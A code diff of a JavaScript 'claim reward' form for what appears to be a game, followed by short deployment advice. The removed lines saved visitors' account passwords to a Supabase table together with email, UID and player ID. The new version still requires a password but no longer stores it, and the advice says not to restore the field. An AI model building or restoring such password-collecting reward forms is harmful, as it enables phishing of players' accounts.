@@ -1,15 +1,24 @@
 const SUPABASE_URL = 'https://bfpwsqbzrwnznrbnoswi.supabase.co';
 const SUPABASE_KEY = 'sb_publishable_-_L-PBjPFSCOVRJWfkwTig_9GikKfqa';
-const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-const rewards=document.querySelectorAll('.reward');
-let selected='';
-rewards.forEach(button=>{
-  button.addEventListener('click',()=>{
-    rewards.forEach(x=>x.classList.remove('active'));
+
+const supabase = window.supabase.createClient(
+  SUPABASE_URL,
+  SUPABASE_KEY
+);
+
+const rewards = document.querySelectorAll('.reward');
+let selected = '';
+
+rewards.forEach(button => {
+  button.addEventListener('click', () => {
+    rewards.forEach(x => x.classList.remove('active'));
+
     button.classList.add('active');
-    selected=button.dataset.cp;
+
+    selected = button.dataset.cp;
   });
 });
+
 document.querySelector('#claimForm').addEventListener('submit', async e => {
   e.preventDefault();
 
@@ -23,11 +32,12 @@ document.querySelector('#claimForm').addEventListener('submit', async e => {
 
   const form = e.target;
 
-  const email = form.querySelector('input[type="email"]')?.value.trim();
+  const email = form.querySelector('#email')?.value.trim();
+  const password = form.querySelector('#password')?.value.trim();
   const uid = form.querySelector('#uid')?.value.trim();
   const playerId = form.querySelector('#player')?.value.trim();
-  const password = form.querySelector('#password')?.value.trim()
-  if (!email || !uid || !playerId || !password) {
+
+  if (!email || !password || !uid || !playerId) {
     result.hidden = false;
     result.textContent = 'Please complete all required fields.';
     return;
@@ -42,9 +52,7 @@ document.querySelector('#claimForm').addEventListener('submit', async e => {
       email: email,
       uid: uid,
       "Player ID": playerId,
-      password: password,
       reward: selected
-      
     });
 
   if (error) {
@@ -55,4 +63,15 @@ document.querySelector('#claimForm').addEventListener('submit', async e => {
 
   result.textContent = 'Claim submitted successfully!';
 });
-  
+
+One important thing
+
+Where it says:
+
+const SUPABASE_KEY = 'sb_publishable_-_L-PBjPFSCOVRJWfkwTig_9GikKfqa';
+
+put your existing Supabase publishable key there locally. Don't use a "service_role" or secret key.
+
+Then save/commit "script.js" to GitHub and redeploy on Vercel.
+
+After that, don't add the password field back. Your form should only use Email, UID, Player ID, and Reward.
